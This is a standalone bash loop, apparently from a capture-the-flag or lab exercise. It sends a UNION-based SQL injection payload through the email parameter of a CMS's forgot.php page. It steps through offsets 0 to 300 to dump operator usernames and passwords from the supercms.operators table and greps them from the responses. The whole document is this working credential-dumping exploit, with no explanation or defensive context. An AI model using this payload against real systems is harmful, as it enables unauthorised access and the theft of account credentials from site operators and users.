for i in $(seq 0 300); do
	payload="email=test@gmail.com' UNIoN SELECT 1,2,3,CONCAT(__username_ , ':', __password_, '@def.com') FROM supercms.operators LIMIT 1 OFFSET $i-- -"
	curl -s -d "$payload" http://10.10.10.31/cmsdata/forgot.php | grep -o '[^ ]*@def.com'
	done
